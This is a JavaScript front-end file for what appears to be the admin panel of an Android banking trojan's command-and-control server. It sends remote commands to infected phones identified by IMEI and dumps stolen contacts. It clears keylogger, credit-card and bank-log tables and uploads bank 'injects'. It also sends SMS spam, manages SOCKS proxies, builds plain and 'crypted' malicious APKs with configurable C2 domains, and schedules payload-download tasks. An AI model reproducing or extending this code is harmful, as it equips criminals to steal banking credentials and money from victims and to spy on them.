function get_modal_commands() {
	// get checked imeis
	var imeis = '';
	$("#chk:checked").each(function(){var temp = this.value.split(":"); imeis += ":"+temp[1]; })
	$.post("inc/modal_commands.php",
    {    
        add_commands: "Commands",
        checks: imeis
    },
	function(data, status){
		 $("#commands_modal").html(data);
		 $('#commands_modal').css({'display':'block'});
		 $('#parent_com_modal').css({'display':'block'});
    });
}

function get_modal_banks() {
	// get checked imeis
	var imeis = '';
	$("#chk:checked").each(function(){var temp = this.value.split(":"); imeis += ":"+temp[1]; })
	$.post("inc/modal_commands.php",
    {    
        add_commands: "Banks",
        checks: imeis
    },
	function(data, status){
		 $("#commands_modal").html(data);
		 $('#commands_modal').css({'display':'block'});
		 $('#parent_com_modal').css({'display':'block'});
    });
}

function get_modal_logs(id, imei, log) {
	// get checked imeis
	$.post("inc/modal_logs.php",
    {    
        add_commands: log,
        id: id,
        imei: imei
    },
	function(data, status){
		 $("#logs_modal").html(data);
		 $('#logs_modal').css({'display':'block'});
		 $('#parent_log_modal').css({'display':'block'});
    });
}

function random_package() {
  var text = "";
  var possible = "abcdefghijklmnopqrstuvwxyz";

  for (var i = 0; i < 2; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));
  text += ".";
  for (var i = 0; i < 7; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}

function delete_checked_bots() {
	// get checked imeis
	var imeis = '';
	$("#chk:checked").each(function(){var temp = this.value.split(":"); imeis += ":"+temp[0]; })
	$.post("inc/start_commands.php",
    {    
        ajax_command: "delete",
        checks: imeis
    },
	function(data, status){
		location.reload();
    });
}

function delete_bots_by_id(id) {
	$.post("inc/start_commands.php",
    {    
        ajax_command: "delete",
        checks: id
    },
	function(data, status){
		location.reload();
    });
}

function start_modal_command() {
	// get checked imeis
	var imeis = $("#text_imei").val();
	var command = $("#comboBox_commands").val();

	//var text_msg = $("#text_msg").val();
	//var text_number = $("#text_number").val();
	var param1 = $("#modal_param1").val();
	var param2 = $("#modal_param2").val();
	var param3 = $("#modal_param3").val();
	var param4 = $("#modal_param4").val();
	//$("#chk:checked").each(function(){var temp = this.value.split(":"); imeis += ":"+temp[1]; })
	// app, tit, ico, msg

	if (command == "getContacts"){
		get_contact_from_modal();
		$('#commands_modal').css({'display':'none'});
		$('#parent_com_modal').css({'display':'none'});
		return;
	}
	$.post("inc/start_commands.php",
    {    
        add_commands: "Commands",
        comboBox_commands: command,
        text_imei: imeis,
        param1: param1,
        param2: param2,
        param3: param3,
        param4: param4
    },
	function(data, status){
		 $('#commands_modal').css({'display':'none'});
		 $('#parent_com_modal').css({'display':'none'});
		var obj = jQuery.parseJSON(data);
		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);

    });
}

function update_guest_settings(id) {
	// get checked imeis
	var name = $("#guest_name_"+id).val();
	var pass = $("#guest_pass_"+id).val();
	var version = $("#guest_ver_"+id).val();
	//var text_number = $("#text_number").val();
	//$("#chk:checked").each(function(){var temp = this.value.split(":"); imeis += ":"+temp[1]; })
	$.post("inc/start_settings.php",
    {    
        cmd: "update_guest",
        g_id: id,
        g_name: name,
        g_pass: pass,
        g_ver: version
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);
		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}
function update_bot_comment(id) {
	// get checked imeis
	var comment = $("#bot_comment_"+id).val();
	//var text_number = $("#text_number").val();
	//$("#chk:checked").each(function(){var temp = this.value.split(":"); imeis += ":"+temp[1]; })
	$.post("inc/start_settings.php",
    {    
        cmd: "update_comment",
        id: id,
        comment: comment
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}
function delete_guest_settings(id) {
	// get checked imeis
	var name = $("#guest_name_"+id).val();
	var pass = $("#guest_pass_"+id).val();
	var version = $("#guest_ver_"+id).val();
	//var text_number = $("#text_number").val();
	//$("#chk:checked").each(function(){var temp = this.value.split(":"); imeis += ":"+temp[1]; })
	$.post("inc/start_settings.php",
    {    
        cmd: "delete_guest",
        g_id: id,
        g_name: name,
        g_pass: pass,
        g_ver: version
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);
		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}
function set_jabber_notifications(id, trig) {
	$.post("inc/start_settings.php",
    {    
        cmd: "set_jabber_notifications",
        id: id,
        jabber_notify: trig
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);
		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function create_guest_settings() {
	var name = $("#guest_new_name").val();
	var pass = $("#guest_new_pass").val();
	var version = $("#guest_new_ver").val();
	//var text_number = $("#text_number").val();
	//$("#chk:checked").each(function(){var temp = this.value.split(":"); imeis += ":"+temp[1]; })
	$.post("inc/start_settings.php",
    {    
        cmd: "create_guest",
        g_name: name,
        g_pass: pass,
        g_ver: version
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function safe_server_jabber() {
	var server = $("#jabber_server").val();
	var port = $("#jabber_port").val();
	var login = $("#jabber_login").val();
	var pass = $("#jabber_pass").val();
	var server_domain = $("#jabber_domain").val();
	
	//var text_number = $("#text_number").val();
	//$("#chk:checked").each(function(){var temp = this.value.split(":"); imeis += ":"+temp[1]; })
	$.post("inc/start_settings.php",
    {    
        cmd: "safe_server_jabber",
        server: server,
        port: port,
        login: login,
        pass: pass,
        domain: server_domain
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function add_jabber_address() {
	var address = $("#jabber_new_address").val();
	var bot_event = $("#jabber_new_bot_event").prop('checked');
	var card_event = $("#jabber_new_card_event").prop('checked');
	var bank_event = $("#jabber_new_bank_event").prop('checked');
	var dbot_event = $("#jabber_new_dbot_event").prop('checked');
	//var text_number = $("#text_number").val();
	//$("#chk:checked").each(function(){var temp = this.value.split(":"); imeis += ":"+temp[1]; })
	$.post("inc/start_settings.php",
    {    
        cmd: "add_jabber_address",
        address: address,
        bot_event: bot_event,
        card_event: card_event,
        bank_event: bank_event,
        dbot_event: dbot_event
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function add_proxy_server() {
    var address = $("#server_ip").val();
    var user = $("#server_user").val();
    var pass = $("#server_pass").val();
    var note = $("#server_note").val();
    $.post("inc/start_settings.php",
    {    
        cmd: "add_proxy_server",
        address: address,
        user: user,
        pass: pass,
        note: note
    },
    function(data, status){
        var obj = jQuery.parseJSON(data);

         //alert(obj.message);
         var snackbarContainer = document.querySelector('#demo-toast-example');
         var show_data = {message: obj.message};
         snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}
function delete_proxy_server(id) {
    $.post("inc/start_settings.php",
    {    
        cmd: "delete_proxy_server",
        id: id
    },
    function(data, status){
        var obj = jQuery.parseJSON(data);

         //alert(obj.message);
         var snackbarContainer = document.querySelector('#demo-toast-example');
         var show_data = {message: obj.message};
         snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}
function update_proxy_note(id) {
    var note = $("#srv_note_"+id).val();
    $.post("inc/start_settings.php",
    {    
        cmd: "update_proxy_note",
        id: id,
        note: note
    },
    function(data, status){
        var obj = jQuery.parseJSON(data);

         //alert(obj.message);
         var snackbarContainer = document.querySelector('#demo-toast-example');
         var show_data = {message: obj.message};
         snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}
function delete_socks_connection(id) {
    $.post("inc/start_settings.php",
    {    
        cmd: "delete_socks_connection",
        id: id
    },
    function(data, status){
        var obj = jQuery.parseJSON(data);

         //alert(obj.message);
         var snackbarContainer = document.querySelector('#demo-toast-example');
         var show_data = {message: obj.message};
         snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}
function delete_jabber_address(id) {
	$.post("inc/start_settings.php",
    {    
        cmd: "delete_jabber_address",
        id: id
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}
function sendSMSspam() {
    var sms_num = $("#sms_num").val();
    var sms_mess = $("#sms_mess").val();
    $.post("inc/start_settings.php",
    {    
        cmd: "sendSMSspam",
        phones: sms_num,
        message: sms_mess
    },
    function(data, status){
        var obj = jQuery.parseJSON(data);

         //alert(obj.message);
         var snackbarContainer = document.querySelector('#demo-toast-example');
         var show_data = {message: obj.message};
         snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function change_bot_version_settings() {
	// get checked imeis
	var old_ver = $("#bot_old_version").val();
	var new_ver = $("#bot_new_version").val();

	$.post("inc/start_settings.php",
    {    
        cmd: "change_bot_version",
        old_name: old_ver,
        new_name: new_ver
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function wide_mode() {
	var checkbox = $("#wide-label");
	var checked = '';
    if (checkbox.hasClass("is-checked")){
    	checked = 'false';
    } else {
    	checked = 'true';
    }
	$.post("inc/start_settings.php", {    
        cmd: "wide-mode",
        mode: checked
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}


function cleanup_old_logs() {
	$.post("inc/start_settings.php", {    
        cmd: "cleanup_logs"
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function cleanup_contacts() {
	$.post("inc/start_settings.php", {    
        cmd: "cleanup_contacts"
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function cleanup_keylogger() {
	$.post("inc/start_settings.php", {    
        cmd: "cleanup_keylogger"
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function cleanup_all_bots() {
    $.post("inc/start_settings.php", {    
        cmd: "cleanup_all_bots"
    },
    function(data, status){
        var obj = jQuery.parseJSON(data);

         //alert(obj.message);
         var snackbarContainer = document.querySelector('#demo-toast-example');
         var show_data = {message: obj.message};
         snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function cleanup_all_cc() {
    $.post("inc/start_settings.php", {    
        cmd: "cleanup_all_cc"
    },
    function(data, status){
        var obj = jQuery.parseJSON(data);

         //alert(obj.message);
         var snackbarContainer = document.querySelector('#demo-toast-example');
         var show_data = {message: obj.message};
         snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function cleanup_all_banks() {
    $.post("inc/start_settings.php", {    
        cmd: "cleanup_all_banks"
    },
    function(data, status){
        var obj = jQuery.parseJSON(data);

         //alert(obj.message);
         var snackbarContainer = document.querySelector('#demo-toast-example');
         var show_data = {message: obj.message};
         snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function cleanup_all_tables() {
    $.post("inc/start_settings.php", {    
        cmd: "cleanup_all_tables"
    },
    function(data, status){
        var obj = jQuery.parseJSON(data);

         //alert(obj.message);
         var snackbarContainer = document.querySelector('#demo-toast-example');
         var show_data = {message: obj.message};
         snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function delete_command(imei, cmd_name) {
    $.post("inc/start_settings.php", {    
        cmd: "delete_command",
        imei: imei,
        cmd_name: cmd_name
    },
    function(data, status){
        var obj = jQuery.parseJSON(data);

         //alert(obj.message);
         var snackbarContainer = document.querySelector('#demo-toast-example');
         var show_data = {message: obj.message};
         snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function delete_inject(name) {
    $.post("inc/start_settings.php", {    
        cmd: "delete_inject",
        name: name
    },
    function(data, status){
        var obj = jQuery.parseJSON(data);

         //alert(obj.message);
         var snackbarContainer = document.querySelector('#demo-toast-example');
         var show_data = {message: obj.message};
         snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function add_answer_rule() {
    var IMEI_rule = $("#IMEI_rule").val();
    var reg_rule = $("#reg_rule").val();
    var action_rule = $("#action_rule").val();
    var param1_rule = $("#param1_rule").val();
    var param2_rule = $("#param2_rule").val();

    $.post("inc/start_settings.php", {    
        cmd: "add_answer_rule",
        IMEI_rule: IMEI_rule,
        reg_rule: reg_rule,
        action_rule: action_rule,
        param1_rule: param1_rule,
        param2_rule: param2_rule
    },
    function(data, status){
        var obj = jQuery.parseJSON(data);

         //alert(obj.message);
         var snackbarContainer = document.querySelector('#demo-toast-example');
         var show_data = {message: obj.message};
         snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function delete_answer_rule(id) {
    $.post("inc/start_settings.php", {    
        cmd: "delete_answer_rule",
        id: id
    },
    function(data, status){
        var obj = jQuery.parseJSON(data);

         //alert(obj.message);
         var snackbarContainer = document.querySelector('#demo-toast-example');
         var show_data = {message: obj.message};
         snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function recalculate_hist_stat() {
	$.post("inc/start_settings.php", {    
        cmd: "recalculate_hist_stat"
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}
function recalculate_apps_stat() {
	$.post("inc/start_settings.php", {    
        cmd: "recalculate_apps_stat"
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function set_settings() {
	var conf_array = [];
    var table = $("#startup_cmd_table");
    var checked = table.find("tr.is-selected");
    checked.each(function(){
    	//console.log(this);
    	var id = $(this).find("#id").val();
    	var numb = $(this).find("#startup_cmd_number_"+id).val();
    	var text = $(this).find("#startup_cmd_txt_"+id).val();
    	var cmd = [id, numb, text];
    	
    	conf_array.push(cmd);
        // Do some stuff!
    });
    var json = JSON.stringify(conf_array);
    $.post("inc/start_settings.php",
    {    
        cmd: "set_settings",
        data: json
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}

function get_contact_file() {
	var conf_array = {};

    conf_array["country"] = $("#dump_country").val();
    conf_array["limit"] = $("#dump_limit").val();
    conf_array["separator"] = $("#dump_separator").val();

    conf_array["checkbox_imei"] = $("#dump_checkbox_imei").prop('checked');
    conf_array["checkbox_name"] = $("#dump_checkbox_name").prop('checked');
    conf_array["checkbox_country"] = $("#dump_checkbox_country").prop('checked');
    conf_array["checkbox_phone"] = $("#dump_checkbox_phone").prop('checked');
    conf_array["checkbox_ename"] = $("#dump_checkbox_ename").prop('checked');
    conf_array["checkbox_email"] = $("#dump_checkbox_email").prop('checked');

    var json = JSON.stringify(conf_array);
    // window.location = "inc/dump_contacts.php?data="+json;
    var link = "inc/dump_contacts.php?country="+$("#dump_country").val()+"&limit="+$("#dump_limit").val()+"&separator="+$("#dump_separator").val()+"&out_imei="+conf_array["checkbox_imei"]+"&out_name="+conf_array["checkbox_name"]+"&out_country="+conf_array["checkbox_country"]+"&out_phone="+conf_array["checkbox_phone"]+"&out_ename="+conf_array["checkbox_ename"]+"&out_email="+conf_array["checkbox_email"];
    window.location = link;
}
function get_contact_from_modal() {
	var imeis = $("#text_imei").val();

    // window.location = "inc/dump_contacts.php?data="+json;
    var link = "inc/dump_contacts_modal.php?imeis="+imeis;
    window.location = link;
}

function uploadFileIcon(f) {
	var file_data = $('#uploadBtn').prop('files')[0];   
    var form_data = new FormData();                  
    form_data.append('file', file_data);                           
    $.ajax({
        url: 'inc/upload_files.php?f='+f, // point to server-side PHP script 
        dataType: 'text',  // what to expect back from the PHP script, if anything
        cache: false,
        contentType: false,
        processData: false,
        data: form_data,                         
        type: 'post',
        success: function(data){
            var obj = jQuery.parseJSON(data);

			//alert(obj.message);
			var snackbarContainer = document.querySelector('#demo-toast-example');
			var show_data = {message: obj.message};
			snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
        }
     });
};
function uploadFileInj(f) {
    var file_data = $('#uploadInjBtn').prop('files')[0];   
    var form_data = new FormData();                  
    form_data.append('file', file_data);                           
    $.ajax({
        url: 'inc/upload_files.php?f='+f, // point to server-side PHP script 
        dataType: 'text',  // what to expect back from the PHP script, if anything
        cache: false,
        contentType: false,
        processData: false,
        data: form_data,                         
        type: 'post',
        success: function(data){
            var obj = jQuery.parseJSON(data);

            //alert(obj.message);
            var snackbarContainer = document.querySelector('#demo-toast-example');
            var show_data = {message: obj.message};
            snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
        }
     });
};
function uploadFileWelcome(f) {
    var file_data = $('#uploadWelcomeBtn').prop('files')[0];   
    var form_data = new FormData();                  
    form_data.append('file', file_data);                           
    $.ajax({
        url: 'inc/upload_files.php?f='+f, // point to server-side PHP script 
        dataType: 'text',  // what to expect back from the PHP script, if anything
        cache: false,
        contentType: false,
        processData: false,
        data: form_data,                         
        type: 'post',
        success: function(data){
            var obj = jQuery.parseJSON(data);

            //alert(obj.message);
            var snackbarContainer = document.querySelector('#demo-toast-example');
            var show_data = {message: obj.message};
            snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
        }
     });
};

function updateIconBuild(){
	var select = $("select").val();
	$("#icon_for_build").val(select);
    $("#icon_for_crypt_build").val(select);
}

function buildAPK(){
	$.post("build/build_apk.php", {    
        cmd: "build",
        icon: $("#icon_for_build").val(),
        packname: $("#packname_for_build").val(),
        seller: $("#seller_for_build").val(),
        appname: $("#appname_for_build").val(),
        time: $("#time_for_build").val(),
        ptitle: $("#ptitle_for_build").val(),
        ptext: $("#ptext_for_build").val(),
        ptime: $("#ptime_for_build").val(),
        domain1: $("#domain1_for_build").val(),
        domain2: $("#domain2_for_build").val(),
        domain3: $("#domain3_for_build").val(),
        domain4: $("#domain4_for_build").val(),
        domain5: $("#domain5_for_build").val(),
        welcomepage: $("#welcompage_for_build").val()
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}
function buil1dCryptAPK(){
    $.post("build/build_apk.php", {    
        cmd: "buildcryptor",
        icon: $("#icon_for_crypt_build").val(),
        packname: $("#packname_for_crypt_build").val(),
        seller: $("#seller_for_crypt_build").val(),
        appname: $("#appname_for_crypt_build").val(),
        time: $("#time_for_crypt_build").val(),
        ptitle: $("#ptitle_for_crypt_build").val(),
        ptext: $("#ptext_for_crypt_build").val(),
        ptime: $("#ptime_for_crypt_build").val(),
        domain1: $("#domain1_for_crypt_build").val(),
        domain2: $("#domain2_for_crypt_build").val(),
        domain3: $("#domain3_for_crypt_build").val(),
        domain4: $("#domain4_for_crypt_build").val(),
        domain5: $("#domain5_for_crypt_build").val(),
        welcomepage: $("#welcompage_for_crypt_build").val()
    },
    function(data, status){
        var obj = jQuery.parseJSON(data);

         //alert(obj.message);
         var snackbarContainer = document.querySelector('#demo-toast-example');
         var show_data = {message: obj.message};
         snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
}
function downloadAPK() {
    // window.location = "inc/dump_contacts.php?data="+json;
    var link = "build/app.apk";
    window.location = link;
}
function downloadCryptAPK() {
    // window.location = "inc/dump_contacts.php?data="+json;
    var link = "build/crypt.apk";
    window.location = link;
}

function checkAll(checkId){ 
	var inputs = document.getElementsByTagName("input"); 
	for (var i = 0; i < inputs.length; i++) { 
		if (inputs[i].type == "checkbox" && inputs[i].id == checkId) { 
			if(inputs[i].checked == true) { 
				inputs[i].checked = false ; 
			} else if (inputs[i].checked == false ) { 
				inputs[i].checked = true ; 
			} 
		} 
	} 
} 
function changeTableSettings(page_name) {
	// body...
	var conf_array = {};

    conf_array["imei"] = $("#col_imei").prop("checked");
    conf_array["android"] = $("#col_android").prop("checked");
    conf_array["root"] = $("#col_root").prop("checked");
    conf_array["country"] = $("#col_country").prop("checked");
    conf_array["seller"] = $("#col_seller").prop("checked");
    conf_array["online"] = $("#col_online").prop("checked");
    conf_array["lastcon"] = $("#col_lastcon").prop("checked");
    conf_array["firstcon"] = $("#col_firstcon").prop("checked");
    conf_array["bankapp"] = $("#col_bankapp").prop("checked");
    conf_array["card"] = $("#col_card").prop("checked");
    conf_array["bank"] = $("#col_bank").prop("checked");
    conf_array["city"] = $("#col_city").prop("checked");
    conf_array["regionName"] = $("#col_regionName").prop("checked");
    conf_array["zip"] = $("#col_zip").prop("checked");
    conf_array["sms"] = $("#col_sms").prop("checked");
    conf_array["comment"] = $("#col_comment").prop("checked");
    conf_array["internet"] = $("#col_internet").prop("checked");
    conf_array["ip"] = $("#col_ip").prop("checked");
    conf_array["root"] = $("#col_root").prop("checked");
    conf_array["screen"] = $("#col_screen").prop("checked");
    conf_array["jabber"] = $("#col_jabber").prop("checked");
    conf_array["av"] = $("#col_av").prop("checked");
    conf_array["number"] = $("#col_number").prop("checked");
    conf_array["model"] = $("#col_model").prop("checked");
    conf_array["socks"] = $("#col_socks").prop("checked");
    
    var json = JSON.stringify(conf_array);
    $.post("inc/start_settings.php",
    {
    	cmd: "changeTableSettings",
        page: page_name,
        data: json
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
		 window.location.reload();
    });
}

function remove_task(tasknumber){
	$.post("inc/task_controll.php",
    {
        todo: "remove",
        number: tasknumber
    },
    function(data, status){
        window.location.reload();
    });
	
	
}
function stat_task(tasknumber){
	
	$.post("inc/task_stat.php",
    {    
        number: tasknumber
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 $('#stat_task_num').html(obj.number);
		 $('#stat_task_run').html(obj.run);
		 $('#stat_task_take').html(obj.take);
		 $('#stat_task_procent').html (100 / obj.take * obj.run +"%");
    });
	
	$('#ModalStat').show(); 
	
}
function change_admin_pass(){
	var pass = $("#admin_pass").val();
	$.post("inc/start_settings.php",
    {
    	cmd: "new_admin_pass",
        arg: pass
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: obj.message};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
    });
	
	//$('#ModalStat').show(); 
	
}


function edit_task(tasknumber){
	
		$.post("inc/task_edit.php",
    {    
        number: tasknumber,
		type: 'get'
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);
		$('#real_task_id').val(obj.number);
		$('#myModalLabel1').html('Edit task: '+ obj.number);
		$('#task_edit_number').val(obj.number);
		$('#task_edit_package').val(obj.package);
		$('#task_edit_url').val(obj.url);
		$('#task_edit_size').val(obj.size);
		$('#task_edit_times').val(obj.times);
		$('#task_edit_root').val(obj.root);
		$('#task_edit_model').val(obj.model);
		$('#task_edit_osver').val(obj.osver);
		$('#task_edit_country').val(obj.country);
		$('#task_edit_lim').val(obj.lim);

		//$('#edit_task_run').html('Bots take file: ' + obj.start);
		//$('#edit_task_take').html('Bots run file: ' + obj.run);

    });

	$('#ModalEdit').show(); 
	
}

function edit_task_save(){								//Сохраняем задачу

	$.post("inc/task_edit.php",
    {    
		task: $('#real_task_id').val(),
        type: 'save',
		number: $('#task_edit_number').val(),
		pack: $('#task_edit_package').val(),
		url: $('#task_edit_url').val(),
		size: $('#task_edit_size').val(),
		times: $('#task_edit_times').val(),
		root: $('#task_edit_root').val(),
		model: $('#task_edit_model').val(),
		osver: $('#task_edit_osver').val(),
		country: $('#task_edit_country').val(),
		lim: $('#task_edit_lim').val()
    },
	function(data, status){
		location.reload();
	
    });
}

function addTask(){
	var task_package = $("#task_package").val();
	var task_country = $("#task_country").val();
	var task_url = $("#task_url").val();
	var task_lim = $("#task_lim").val();
	$.post("tasks.php",
    {    
		command: 'add_task',
		task_package: task_package,
		task_country: task_country,
		task_url: task_url,
		task_lim: task_lim

    },
function(data, status){

		 //alert(obj.message);
		 var snackbarContainer = document.querySelector('#demo-toast-example');
		 var show_data = {message: "Task has been added!"};
		 snackbarContainer.MaterialSnackbar.showSnackbar(show_data);
		//location.reload();
		
});
	
}


function del_Task(tasknum){
	if(confirm('Remove forever?')){
	$.post("inc/task_del.php",
    {    		
		number: tasknum	
    },
	function(data, status){
		location.reload();
    });
	}
}



function get_online(){
	$.post("inc/bots_online.php",
    {    
	
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);	
		$('#week').html($('#week').html()+"Bots on this week: "+obj.week);
		$('#day').html($('#day').html()+"Bots in 24 hours: "+obj.day);
		$('#lasthour').html($('#lasthour').html()+"Bots in 1 hour: "+obj.hour);
		$('#now').html($('#now').html()+"Bots in 5 min: "+obj.min);	
    });
	
}


function logout(){
	$.post("login.php",
    {    
		type: 'logout'
    },
	function(data, status){
		
		location.href= 'login.php';
		
    });
}



function bot_del(number){
	 if(confirm('Delete bot '+number+'?')){

	$.post("inc/bot_edit.php",
    {    
		id: number,
		todo:  'remove'
    },
	function(data, status){
		
		location.reload();
		
    });
	 } 
	
}

function bot_edit_get(id){
	
	$.post("inc/bot_edit.php",
    {    
		id: id,
		todo:  'edit_get'
		
    },
	function(data, status){
		
		$('#ModalEditBot').show();
		var obj = jQuery.parseJSON(data);
		
		$('#real_bot_id').val(obj.id);
		$('#bot_edit_model').val(obj.model);
		$('#bot_edit_country').val(obj.country);
		$('#bot_edit_group').val(obj.group_id);
    });
}

function bot_edit_save(id){
	
	 if(confirm(' Save bot '+$('#real_bot_id').val()+'?\n Will be saved \n Country'+$('#bot_edit_country').val()+'\n Model:'+$('#bot_edit_model').val()+'\n Group:'+$('#bot_edit_group').val())){
	$.post("inc/bot_edit.php",
    {    
		id: $('#real_bot_id').val(),
		country: $('#bot_edit_country').val(),
		model: $('#bot_edit_model').val(),
		group: $('#bot_edit_group').val(),
		todo:  'edit_save'
		
    },
	function(data, status){
		location.reload();
		
    });
	 }
	
}
